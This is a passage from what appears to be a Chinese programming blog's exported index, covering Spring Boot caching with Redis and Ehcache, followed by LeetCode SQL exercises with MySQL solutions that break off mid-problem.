&quot;student&quot;)：配置了该数据访问对象中返回的内容将存储于名为student的缓存对象中，我们也可以不使用该注解，直接通过@Cacheable自己配置缓存集的名字来定义； @Cacheable：配置了queryStudentBySno函数的返回值将被加入缓存。同时在查询时，会先从缓存中获取，若不存在才再发起对数据库的访问。该注解主要有下面几个参数： value、cacheNames：两个等同的参数（cacheNames为Spring 4新增，作为value的别名），用于指定缓存存储的集合名。由于Spring 4中新增了@CacheConfig，因此在Spring 3中原本必须有的value属性，也成为非必需项了； key：缓存对象存储在Map集合中的key值，非必需，缺省按照函数的所有参数组合作为key值，若自己配置需使用SpEL表达式，比如：@Cacheable(key = &quot;#p0&quot;)：使用函数第一个参数作为缓存的key值，更多关于SpEL表达式的详细内容可参考https://docs.spring.io/spring/docs/current/spring-framework-reference/integration.html#cache； condition：缓存对象的条件，非必需，也需使用SpEL表达式，只有满足表达式条件的内容才会被缓存，比如：@Cacheable(key = &quot;#p0&quot;, condition = &quot;#p0.length() &lt; 3&quot;)，表示只有当第一个参数的长度小于3的时候才会被缓存； unless：另外一个缓存条件参数，非必需，需使用SpEL表达式。它不同于condition参数的地方在于它的判断时机，该条件是在函数被调用之后才做判断的，所以它可以通过对result进行判断； keyGenerator：用于指定key生成器，非必需。若需要指定一个自定义的key生成器，我们需要去实现org.springframework.cache.interceptor.KeyGenerator接口，并使用该参数来指定； cacheManager：用于指定使用哪个缓存管理器，非必需。只有当有多个时才需要使用； cacheResolver：用于指定使用那个缓存解析器，非必需。需通过org.springframework.cache.interceptor.CacheResolver接口来实现自己的缓存解析器，并用该参数指定； @CachePut：配置于函数上，能够根据参数定义条件来进行缓存，其缓存的是方法的返回值，它与@Cacheable不同的是，它每次都会真实调用函数，所以主要用于数据新增和修改操作上。它的参数与@Cacheable类似，具体功能可参考上面对@Cacheable参数的解析； @CacheEvict：配置于函数上，通常用在删除方法上，用来从缓存中移除相应数据。除了同@Cacheable一样的参数之外，它还有下面两个参数： allEntries：非必需，默认为false。当为true时，会移除所有数据； beforeInvocation：非必需，默认为false，会在调用方法之后移除数据。当为true时，会在调用方法之前移除数据。 缓存实现要使用上Spring Boot的缓存功能，还需要提供一个缓存的具体实现。Spring Boot根据下面的顺序去侦测缓存实现： Generic JCache (JSR-107) EhCache 2.x Hazelcast Infinispan Redis Guava Simple 除了按顺序侦测外，我们也可以通过配置属性spring.cache.type来强制指定。 接下来主要介绍基于Redis和Ehcache的缓存实现。 RedisRedis的下载地址为https://github.com/MicrosoftArchive/redis/releases，Redis 支持 32 位和 64 位。这个需要根据你系统平台的实际情况选择，这里我们下载 Redis-x64-xxx.zip压缩包到C盘。打开一个CMD窗口，输入如下命令： 123456789101112131415161718192021222324C:\Users\Administrator&gt;cd c:\Redis-x64-3.2.100c:\Redis-x64-3.2.100&gt;redis-server.exe redis.windows.conf _._ _.-``__ &apos;&apos;-._ _.-`` `. `_. &apos;&apos;-._ Redis 3.2.100 (00000000/0) 64 bit .-`` .-```. ```\/ _.,_ &apos;&apos;-._ ( &apos; , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|&apos;` _.-&apos;| Port: 6379 | `-._ `._ / _.-&apos; | PID: 6404 `-._ `-._ `-./ _.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | http://redis.io `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; `-._ `-.__.-&apos; _.-&apos; `-._ _.-&apos; `-.__.-&apos;[6404] 25 Dec 09:47:58.890 # Server started, Redis version 3.2.100[6404] 25 Dec 09:47:58.898 * DB loaded from disk: 0.007 seconds[6404] 25 Dec 09:47:58.898 * The server is now ready to accept connections on port 6379 然后打开另外一个CMD终端，输入： 1234C:\Users\Administrator&gt;cd c:\Redis-x64-3.2.100c:\Redis-x64-3.2.100&gt;redis-cli.exe -p 6379127.0.0.1:6379&gt; 准备工作做完后，接下来开始在Spring Boot项目里引入Redis： 12345&lt;!-- spring-boot redis --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 在application.yml中配置Redis： 12345678910111213141516171819spring: redis: # Redis数据库索引（默认为0） database: 0 # Redis服务器地址 host: localhost # Redis服务器连接端口 port: 6379 pool: # 连接池最大连接数（使用负值表示没有限制） max-active: 8 # 连接池最大阻塞等待时间（使用负值表示没有限制） max-wait: -1 # 连接池中的最大空闲连接 max-idle: 8 # 连接池中的最小空闲连接 min-idle: 0 # 连接超时时间（毫秒） timeout: 0 更多关于Spring Boot Redis配置可参考：&lt;https://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html# REDIS&gt; 接着创建一个Redis配置类： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Configurationpublic class RedisConfig extends CachingConfigurerSupport &#123; // 自定义缓存key生成策略 @Bean public KeyGenerator keyGenerator() &#123; return new KeyGenerator() &#123; @Override public Object generate(Object target, java.lang.reflect.Method method, Object... params) &#123; StringBuffer sb = new StringBuffer(); sb.append(target.getClass().getName()); sb.append(method.getName()); for (Object obj : params) &#123; sb.append(obj.toString()); &#125; return sb.toString(); &#125; &#125;; &#125; // 缓存管理器 @Bean public CacheManager cacheManager(@SuppressWarnings(&quot;rawtypes&quot;) RedisTemplate redisTemplate) &#123; RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate); // 设置缓存过期时间（秒） cacheManager.setDefaultExpiration(3600); return cacheManager; &#125; @Bean public RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory factory) &#123; StringRedisTemplate template = new StringRedisTemplate(factory); setSerializer(template);// 设置序列化工具 template.afterPropertiesSet(); return template; &#125; private void setSerializer(StringRedisTemplate template) &#123; @SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;) Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class); ObjectMapper om = new ObjectMapper(); om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); jackson2JsonRedisSerializer.setObjectMapper(om); template.setValueSerializer(jackson2JsonRedisSerializer); &#125;&#125; 运行测试，控制台输出： 123452017-11-17 18:17:06.995 DEBUG 8836 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-17 18:17:07.128 DEBUG 8836 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-17 18:17:07.152 DEBUG 8836 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：KangKang学号001的学生姓名为：KangKang 第二次查询没有访问数据库，而是从缓存中获取的，在redis中查看该值： 12345127.0.0.1:6379&gt; keys *1) &quot;student~keys&quot;2) &quot;001&quot;127.0.0.1:6379&gt; get 001&quot;[\&quot;com.springboot.bean.Student\&quot;,&#123;\&quot;sno\&quot;:\&quot;001\&quot;,\&quot;name\&quot;:\&quot;KangKang\&quot;,\&quot;sex\&quot;:\&quot;M \&quot;&#125;]&quot; 在测试方法中测试更新： 1234567891011@Testpublic void test() throws Exception &#123; Student student1 = this.studentService.queryStudentBySno(&quot;001&quot;); System.out.println(&quot;学号&quot; + student1.getSno() + &quot;的学生姓名为：&quot; + student1.getName()); student1.setName(&quot;康康&quot;); this.studentService.update(student1); Student student2 = this.studentService.queryStudentBySno(&quot;001&quot;); System.out.println(&quot;学号&quot; + student2.getSno() + &quot;的学生姓名为：&quot; + student2.getName());&#125; 控制台输出： 123456789学号001的学生姓名为：KangKang2017-11-17 19:30:05.813 INFO 11244 --- [main] com.alibaba.druid.pool.DruidDataSource : &#123;dataSource-1&#125; inited2017-11-17 19:30:05.823 DEBUG 11244 --- [main] c.s.mapper.StudentMapper.update : ==&gt; Preparing: update student set sname=?,ssex=? where sno=? 2017-11-17 19:30:05.941 DEBUG 11244 --- [main] c.s.mapper.StudentMapper.update : ==&gt; Parameters: 康康(String), M (String), 001(String)2017-11-17 19:30:05.953 DEBUG 11244 --- [main] c.s.mapper.StudentMapper.update : &lt;== Updates: 12017-11-17 19:30:05.957 DEBUG 11244 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-17 19:30:05.959 DEBUG 11244 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-17 19:30:05.976 DEBUG 11244 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：康康 在redis中查看： 12127.0.0.1:6379&gt; get 001&quot;[\&quot;com.springboot.bean.Student\&quot;,&#123;\&quot;sno\&quot;:\&quot;001\&quot;,\&quot;name\&quot;:\&quot;\xe5\xba\xb7\xe5\xba\xb7\&quot;,\&quot;sex\&quot;:\&quot;M \&quot;&#125;]&quot; 可见更新数据库的同时，缓存也得到了更新。 Ehcache引入Ehcache依赖： 12345&lt;!-- ehcache --&gt;&lt;dependency&gt; &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt; &lt;artifactId&gt;ehcache&lt;/artifactId&gt;&lt;/dependency&gt; 在src/main/resources目录下新建ehcache.xml： 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ehcache xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation=&quot;ehcache.xsd&quot;&gt; &lt;defaultCache maxElementsInMemory=&quot;10000&quot; eternal=&quot;false&quot; timeToIdleSeconds=&quot;3600&quot; timeToLiveSeconds=&quot;0&quot; overflowToDisk=&quot;false&quot; diskPersistent=&quot;false&quot; diskExpiryThreadIntervalSeconds=&quot;120&quot; /&gt; &lt;cache name=&quot;student&quot; maxEntriesLocalHeap=&quot;2000&quot; eternal=&quot;false&quot; timeToIdleSeconds=&quot;3600&quot; timeToLiveSeconds=&quot;0&quot; overflowToDisk=&quot;false&quot; statistics=&quot;true&quot;/&gt;&lt;/ehcache&gt; 关于Ehcahe的一些说明： name：缓存名称。 maxElementsInMemory：缓存最大数目 maxElementsOnDisk：硬盘最大缓存个数。 eternal：对象是否永久有效，一但设置了，timeout将不起作用。 overflowToDisk：是否保存到磁盘。 timeToIdleSeconds:设置对象在失效前的允许闲置时间（单位：秒）。仅当eternal=false对象不是永久有效时使用，可选属性，默认值是0，也就是可闲置时间无穷大。 timeToLiveSeconds：设置对象在失效前允许存活时间（单位：秒）。最大时间介于创建时间和失效时间之间。仅当eternal=false对象不是永久有效时使用，默认是0，也就是对象存活时间无穷大。 diskPersistent：是否缓存虚拟机重启期数据，默认值为false。 diskSpoolBufferSizeMB：这个参数设置DiskStore（磁盘缓存）的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区。 diskExpiryThreadIntervalSeconds：磁盘失效线程运行时间间隔，默认是120秒。 memoryStoreEvictionPolicy：当达到maxElementsInMemory限制时，Ehcache将会根据指定的策略去清理内存。默认策略是LRU（最近最少使用）。你可以设置为FIFO（先进先出）或是LFU（较少使用）。 clearOnFlush：内存数量最大时是否清除。 memoryStoreEvictionPolicy：Ehcache的三种清空策略：FIFO，first in first out，这个是大家最熟的，先进先出。LFU， Less Frequently Used，就是上面例子中使用的策略，直白一点就是讲一直以来最少被使用的。如上面所讲，缓存的元素有一个hit属性，hit值最小的将会被清出缓存。LRU，Least Recently Used，最近最少使用的，缓存的元素有一个时间戳，当缓存容量满了，而又需要腾出地方来缓存新的元素的时候，那么现有缓存元素中时间戳离当前时间最远的元素将被清出缓存。 接着在application.yml中指定ehcache配置的路径： 1234spring: cache: ehcache: config: &apos;classpath:ehcache.xml&apos; 这样就可以开始使用ehcache了，运行测试类，观察控制台： 123452017-11-18 09:10:40.201 DEBUG 3364 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-18 09:10:40.343 DEBUG 3364 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-18 09:10:40.364 DEBUG 3364 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：KangKang学号001的学生姓名为：KangKang 可看到第二次是从缓存中获取的。 测试更新： 12345678910112017-11-18 09:18:04.230 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-18 09:18:04.397 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-18 09:18:04.427 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：KangKang2017-11-18 09:18:04.433 DEBUG 11556 --- [main] c.s.mapper.StudentMapper.update : ==&gt; Preparing: update student set sname=?,ssex=? where sno=? 2017-11-18 09:18:04.438 DEBUG 11556 --- [main] c.s.mapper.StudentMapper.update : ==&gt; Parameters: 康康(String), M (String), 001(String)2017-11-18 09:18:04.440 DEBUG 11556 --- [main] c.s.mapper.StudentMapper.update : &lt;== Updates: 12017-11-18 09:18:04.440 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Preparing: select * from student where sno=? 2017-11-18 09:18:04.441 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : ==&gt; Parameters: 001(String)2017-11-18 09:18:04.442 DEBUG 11556 --- [main] c.s.m.StudentMapper.queryStudentBySno : &lt;== Total: 1学号001的学生姓名为：康康 可见，即使更新方法加了@CachePut注解，第二次查询因为Student对象更新了，其是从数据库获取数据的，所以对于Ehcache来说，更新方法加不加@CachePut注解，结果都一样。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>Redis</tag>
        <tag>Ehcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leetcode-SQL题目]]></title>
    <url>%2F2019%2F01%2F03%2Fleetcode-SQL%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[组合两个表表1: Person12345678+-------------+---------+| 列名 | 类型 |+-------------+---------+| PersonId | int || FirstName | varchar || LastName | varchar |+-------------+---------+PersonId 是上表主键 表2: Address123456789+-------------+---------+| 列名 | 类型 |+-------------+---------+| AddressId | int || PersonId | int || City | varchar || State | varchar |+-------------+---------+AddressId 是上表主键 编写一个 SQL 查询，满足条件：无论 person 是否有地址信息，都需要基于上述两表提供 person 的以下信息： 1FirstName, LastName, City, State 解决方案：12345# Write your MySQL query statement belowselect FirstName, LastName, City, Statefrom Person left join Addresson Person.PersonId = Address.PersonId; 第二高的薪水编写一个 SQL 查询，获取 Employee 表中第二高的薪水（Salary） 。1234567+----+--------+| Id | Salary |+----+--------+| 1 | 100 || 2 | 200 || 3 | 300 |+----+--------+ 例如上述 Employee 表，SQL查询应该返回 200 作为第二高的薪水。如果不存在第二高的薪水，那么查询应返回 null。12345+---------------------+| SecondHighestSalary |+---------------------+| 200 |+---------------------+ 解决方案：123456789# Write your MySQL query statement belowSELECT (SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT 1 OFFSET 1) AS SecondHighestSalary; 第N高的薪水编写一个 SQL 查询，获取 Employee 表中第 n 高的薪水（Salary）。1234567+----+--------+| Id | Salary |+----+--------+| 1 | 100 || 2 | 200 || 3 | 300 |+----+--------+ 例如上述 Employee 表，n = 2 时，应返回第二高的薪水 200。如果不存在第 n 高的薪水，那么查询应返回 null。12345+------------------------+| getNthHighestSalary(2) |+------------------------+| 200 |+------------------------+ 解决方案：1234567CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN RETURN ( # Write your MySQL query statement below. select (IF((select count(*) from (select distinct e.Salary from Employee e) e)&gt;=N,(select min(e.Salary) from (select distinct e.Salary from Employee e order by e.Salary desc limit N) e), NULL)) );END 分数排名编写一个 SQL 查询来实现分数排名。如果两个分数相同，则两个分数排名（Rank）相同。请注意，平分后的下一个名次应该是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。12345678910+----+-------+| Id | Score |+----+-------+| 1 | 3.50 || 2 | 3.65 || 3 | 4.00 || 4 | 3.85 || 5 | 4.00 || 6 | 3.65 |+----+-------+ 例如，根据上述给定的 Scores 表，你的查询应该返回（按分数从高到低排列）：12345678910+-------+------+| Score | Rank |+-------+------+| 4.00 | 1 || 4.00 | 1 || 3.85 | 2 || 3.65 | 3 || 3.65 | 3 || 3.50 | 4 |+-------+------+ 解决方案：12# Write your MySQL query statement belowselect Score,(select count(*) from (select distinct Score as s from Scores) as new_scores where s &gt;= Score) Rank from Scores order by Score desc 连续出现的数字编写一个 SQL 查询，查找所有至少连续出现三次的数字。1234567891011+----+-----+| Id | Num |+----+-----+| 1 | 1 || 2 | 1 || 3 | 1 || 4 | 2 || 5 | 1 || 6 | 2 || 7 | 2 |+----+-----+ 例如，给定上面的 Logs 表， 1 是唯一连续出现至少三次的数字。12345+-----------------+| ConsecutiveNums |+-----------------+| 1 |+-----------------+ 解决方案：1234567891011# Write your MySQL query statement belowselect distinct Num as ConsecutiveNumsfrom ( select Num, case when @prev = Num then @count := @count + 1 when (@prev := Num) is not null then @count := 1 end as CNT from Logs, (select @prev := null,@count := null) as t) as tempwhere temp.CNT &gt;= 3 超过经理收入的员工Employee 表包含所有员工，他们的经理也属于员工。每个员工都有一个 Id，此外还有一列对应员工的经理的 Id。12345678+----+-------+--------+-----------+| Id | Name | Salary | ManagerId |+----+-------+--------+-----------+| 1 | Joe | 70000 | 3 || 2 | Henry | 80000 | 4 || 3 | Sam | 60000 | NULL || 4 | Max | 90000 | NULL |+----+-------+--------+-----------+ 给定 Employee 表，编写一个 SQL 查询，该查询可以获取收入超过他们经理的员工的姓名。在上面的表格中，Joe 是唯一一个收入超过他的经理的员工。12345+----------+| Employee |+----------+| Joe |+----------+ 解决方案：123456# Write your MySQL query statement belowselect e.Name as Employee from Employee eleft join Employee e2 on e.ManagerId = e2.Id where e.Salary &gt; e2.Salary 查找重复的电子邮箱编写一个 SQL 查询，查找 Person 表中所有重复的电子邮箱。 示例： 1234567+----+---------+| Id | Email |+----+---------+| 1 | a@b.com || 2 | c@d.com || 3 | a@b.com |+----+---------+ 根据以上输入，你的查询应返回以下结果：12345+---------+| Email |+---------+| a@b.com |+---------+ 说明：所有电子邮箱都是小写字母。 解决方案：12345# Write your MySQL query statement belowselect Emailfrom Persongroup by Emailhaving count(Email) &gt; 1; 从不订购的客户某网站包含两个表，Customers 表和 Orders 表。编写一个 SQL 查询，找出所有从不订购任何东西的客户。 Customers 表：12345678+----+-------+| Id | Name |+----+-------+| 1 | Joe || 2 | Henry || 3 | Sam || 4 | Max |+----+-------+ Orders 表：123456+----+------------+| Id | CustomerId |+----+------------+| 1 | 3 || 2 | 1 |+----+------------+ 例如给定上述表格，你的查询应返回：123456+-----------+| Customers |+-----------+| Henry || Max |+-----------+ 解决方案：12345select customers.name as &apos;Customers&apos;from customerswhere customers.id not in( select customerid from orders); 部门工资最高的员工Employee 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id。 12345678+----+-------+--------+--------------+| Id | Name | Salary | DepartmentId |+----+-------+--------+--------------+| 1 | Joe | 70000 | 1 || 2 | Henry | 80000 | 2 || 3 | Sam | 60000 | 2 || 4 | Max | 90000 | 1 |+----+-------+--------+--------------+ Department 表包含公司所有部门的信息。123456+----+----------+| Id | Name |+----+----------+| 1 | IT || 2 | Sales |+----+----------+ 编写一个 SQL 查询，找出每个部门工资最高的员工。例如，根据上述给定的表格，Max 在 IT 部门有最高工资，Henry 在 Sales 部门有最高工资。 123456+------------+----------+--------+| Department | Employee | Salary |+------------+----------+--------+| IT | Max | 90000 || Sales | Henry | 80000 |+------------+----------+--------+ 解决方案：1234567891011# Write your MySQL query statement belowselect d.Name as Department, e.Name as Employee, e.Salary from Employee e,Department d where e.DepartmentId=d.id and (e.Salary,e.DepartmentId) in (select max(Salary),DepartmentId from Employee group by DepartmentId); 部门工资前三高的员工Employee 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id 。12345678910+----+-------+--------+--------------+| Id | Name | Salary | DepartmentId |+----+-------+--------+--------------+| 1 | Joe | 70000 | 1 || 2 | Henry | 80000 | 2 || 3 | Sam | 60000 | 2 || 4 | Max | 90000 | 1 || 5 | Janet | 69000 | 1 || 6 | Randy | 85000 | 1 |+----+-------+--------+--------------+ Department 表包含公司所有部门的信息。123456+----+----------+| Id | Name |+----+----------+| 1 | IT || 2 | Sales |+----+----------+ 编写一个 SQL 查询，找出每个部门工资前三高的员工。例如，根据上述给定的表格，查询结果应返回：12345678910+------------+----------+--------+| Department | Employee | Salary |+------------+----------+--------+| IT | Max | 90000 || IT | Randy | 85000 || IT | Joe | 70000 || Sales | Henry | 80000 || Sales | Sam | 60000 |+------------+----------+--------+ 解决方案：123456789101112# Write your MySQL query statement belowSELECT P2.Name AS Department,P3.Name AS Employee,P3.Salary AS SalaryFROM Employee AS P3INNER JOIN Department AS P2ON P2.Id = P3.DepartmentId WHERE ( SELECT COUNT(DISTINCT Salary) FROM Employee AS P4 WHERE P3.DepartmentId = P4.DepartmentId AND P4.Salary &gt;= P3.Salary) &lt;= 3ORDER BY DepartmentId,Salary DESC 删除重复的电子邮箱编写一个 SQL 查询，来删除 Person 表中所有重复的电子邮箱，重复的邮箱里只保留 Id 最小 的那个。12345678+----+------------------+| Id | Email |+----+------------------+| 1 | john@example.com || 2 | bob@example.com || 3 | john@example.com |+----+------------------+Id 是这个表的主键。 例如，在运行你的查询语句之后，上面的 Person 表应返回以下几行:123456+----+------------------+| Id | Email |+----+------------------+| 1 | john@example.com || 2 | bob@example.com |+----+------------------+ 解决方案：12345# Write your MySQL query statement belowDELETE p1 FROM Person p1, Person p2WHERE p1.Email = p2.Email AND p1.Id &gt; p2.Id 上升的温度给定一个 Weather 表，编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 Id。12345678+---------+------------------+------------------+| Id(INT) | RecordDate(DATE) | Temperature(INT) |+---------+------------------+------------------+| 1 | 2015-01-01 | 10 || 2 | 2015-01-02 | 25 || 3 | 2015-01-03 | 20 || 4 | 2015-01-04 | 30 |+---------+------------------+------------------+ 例如，根据上述给定的 Weather 表格，返回如下 Id:123456+----+| Id |+----+| 2 || 4 |+----+ 解决方案：123456789101112131415161718192021222324# Write your MySQL query statement belowselect Idfrom (select w.*, @curd := w.RecordDate, @curt := w.Temperature, @isH := if(datediff(@curd,@pred) = 1 and @curt &gt; @pret,1,0) as r, @pret := @curt, @pred := @curd from Weather w, (select @curd := null, @pred := null, @curt := 0, @pret := 0, @isH := 0 ) init order by w.RecordDate ) twhere t.r = 1 行程和用户Trips 表中存所有出租车的行程信息。每段行程有唯一键 Id，Client_Id 和 Driver_Id 是 Users 表中 Users_Id 的外键。Status 是枚举类型，枚举成员为 (‘completed’, ‘cancelled_by_driver’, ‘cancelled_by_client’)。123456789101112131415+----+-----------+-----------+---------+--------------------+----------+| Id | Client_Id | Driver_Id | City_Id | Status |Request_at|+----+-----------+-----------+---------+--------------------+----------+| 1 | 1 | 10 | 1 | completed |2013-10-01|| 2 | 2 | 11 | 1 | cancelled_by_driver|2013-10-01|| 3 | 3 | 12 | 6 | completed |2013-10-01|| 4 | 4 | 13 | 6 | cancelled_by_client|2013-10-01|| 5 | 1 | 10 | 1 | completed |2013-10-02|| 6 | 2 | 11 | 6 | completed |2013-10-02|| 7 | 3 | 12 | 6 | completed |2013-10-02|| 8 | 2 | 12 | 12 | completed |2013-10-03|| 9 | 3 | 10 | 12 | completed |2013-10-03| | 10 | 4 | 13 | 12 | cancelled_by_driver|2013-10-03|+----+-----------+-----------+---------+--------------------+----------+ Users 表存所有用户。每个用户有唯一键 Users_Id。Banned 表示这个用户是否被禁止，Role 则是一个表示（‘client’, ‘driver’, ‘partner’）的枚举类型。12345678910111213+----------+--------+--------+| Users_Id | Banned | Role |+----------+--------+--------+| 1 | No | client || 2 | Yes | client || 3 | No | client || 4 | No | client || 10 | No | driver || 11 | No | driver || 12 | No | driver || 13 | No | driver |+----------+--------+--------+ 写一段 SQL 语句查出 2013年10月1日 至 2013年10月3日 期间非禁止用户的取消率。基于上表，你的 SQL 语句应返回如下结果，取消率（Cancellation Rate）保留两位小数。1234567+------------+-------------------+| Day | Cancellation Rate |+------------+-------------------+| 2013-10-01 | 0.33 || 2013-10-02 | 0.00 || 2013-10-03 | 0.50 |+------------+-------------------+ 解决方案：123456789101112131415161718# Write your MySQL query statement belowselect t.request_at Day, ( round(count(if(status != &apos;completed&apos;, status, null)) / count(status), 2) ) as &apos;Cancellation Rate&apos;from Users u inner join Trips ton u.Users_id = t.Client_Idand u.banned != &apos;Yes&apos;where t.Request_at &gt;= &apos;2013-10-01&apos;and t.Request_at &lt;= &apos;2013-10-03&apos;group by t.Request_at 大的国家这里有张 World 表123456789+-----------------+------------+------------+--------------+---------------+| name | continent | area | population | gdp |+-----------------+------------+------------+--------------+---------------+| Afghanistan | Asia | 652230 | 25500100 | 20343000 || Albania | Europe | 28748 | 2831741 | 12960000 || Algeria | Africa | 2381741 | 37100000 | 188681000 || Andorra | Europe | 468 | 78115 | 3712000 || Angola | Africa | 1246700 | 20609294 | 100990000 |+-----------------+------------+------------+--------------+---------------+ 如果一个国家的面积超过300万平方公里，或者人口超过2500万，那么这个国家就是大国家。编写一个SQL查询，输出表中所有大国家的名称、人口和面积。例如，根据上表，我们应该输出:123456+--------------+-------------+--------------+| name | population | area |+--------------+-------------+--------------+| Afghanistan | 25500100 | 652230 || Algeria | 37100000 | 2381741 |+--------------+-------------+--------------+ 解决方案：1234# Write your MySQL query statement belowselect name,population,area from Worldwhere area&gt;3000000 or population&gt;25000000 超过5名学生的课有一个courses 表 ，有: student (学生) 和 class (课程)。请列出所有超过或等于5名学生的课。例如,表:12345678910111213+---------+------------+| student | class |+---------+------------+| A | Math || B | English || C | Math || D | Biology || E | Math || F | Computer || G | Math || H | Math || I | Math |+---------+------------+ 应该输出:12345+---------+| class |+---------+| Math |+---------+ Note:学生在每个课中不应被重复计算。 解决方案：1234# Write your MySQL query statement belowselect class from coursesgroup by class having count(distinct student) &gt;=5 ; 体育馆的人流量X 市建了一个新的体育馆，每日人流量信息被记录在这三列信息中：序号 (id)、日期 (date)、 人流量 (people)。请编写一个查询语句，找出高峰期时段，要求连续三天及以上，并且每天人流量均不少于100。 例如，表 stadium：123456789101112+------+------------+-----------+| id | date | people |+------+------------+-----------+| 1 | 2017-01-01 | 10 || 2 | 2017-01-02 | 109 || 3 | 2017-01-03 | 150 || 4 | 2017-01-04 | 99 || 5 | 2017-01-05 | 145 || 6 | 2017-01-06 | 1455 || 7 | 2017-01-07 | 199 || 8 | 2017-01-08 | 188 |+------+------------+-----------+ 对于上面的示例数据，输出为：12345678+------+------------+-----------+| id | date | people |+------+------------+-----------+| 5 | 2017-01-05 | 145 || 6 | 2017-01-06 | 1455 || 7 | 2017-01-07 | 199 || 8 | 2017-01-08 | 188 |+------+------------+-----------+ Note:每天只有一行记录，日期随着 id 的增加而增加。 解决方案：12345678# Write your MySQL query statement belowselect distinct a.* from stadium a,stadium b,stadium cwhere a.people&gt;=100 and b.people&gt;=100 and c.people&gt;=100and ( (a.id = b.id-1 and b.id = c.id -1) or (a.id = b.id-1 and a.id = c.id +1) or (a.id = b.id+1 and b.id = c.id +1)) order by a.id 有趣的电影某城市开了一家新的电影院，吸引了很多人过来看电影。该电影院特别注意用户体验，专门有个 LED显示板做电影推荐，上面公布着影评和相关电影描述。 作为该电影院的信息部主管，您需要编写一个 SQL查询，找出所有影片描述为非 boring (不无聊) 的并且 id 为奇数 的影片，结果请按等级 rating 排列。 例如，下表 cinema:123456789+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 1 | War | great 3D | 8.9 || 2 | Science | fiction | 8.5 || 3 | irish | boring | 6.2 || 4 | Ice song | Fantacy | 8.6 || 5 | House card| Interesting| 9.1 |+---------+-----------+--------------+-----------+ 对于上面的例子，则正确的输出是为：123456+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 5 | House card| Interesting| 9.1 || 1 | War | great 3D | 8.9 |+---------+-----------+--------------+-----------+ 解决方案：12# Write your MySQL query statement belowselect * from cinema where description != &apos;boring&apos; and id&amp;1 order by rating desc 换座位小美是一所中学的信息科技老师，她有一张 seat 座位表，平时用来储存学生名字和与他们相对应的座位 id。 其中纵列的 id 是连续递增的小美想改变相邻俩学生的座位。 你能不能帮她写一个 SQL query 来输出小美想要的结果呢？ 示例：123456789+---------+---------+| id | student |+---------+---------+| 1 | Abbot || 2 | Doris || 3 | Emerson || 4 | Green || 5 | Jeames |+---------+---------+ 假如数据输入的是上表，则输出结果如下：123456789+---------+---------+| id | student |+---------+---------+| 1 | Doris || 2 | Abbot || 3 | Green || 4 | Emerson || 5 | Jeames |+---------+---------+ 注意：如果学生人数是奇数，则不需要改变最后一个同学的座位。 解决方案：123# Write your MySQL query statement belowselect if((mod(id,2)=1 and id = (select max(id) from seat)),id,if(mod(id,2)=1,id+1,id-1)) as id,student from seat order by id 交换工资给定一个 salary 表，如下所示，有 m = 男性 和 f = 女性 的值。交换所有的 f 和 m 值（例如，将所有 f 值更改为 m，反之亦然）。要求只使用一个更新（Update）语句，并且没有中间的临时表。 注意，您必只能写一个 Update 语句，请不要编写任何 Select 语句。 例如：123456| id | name | sex | 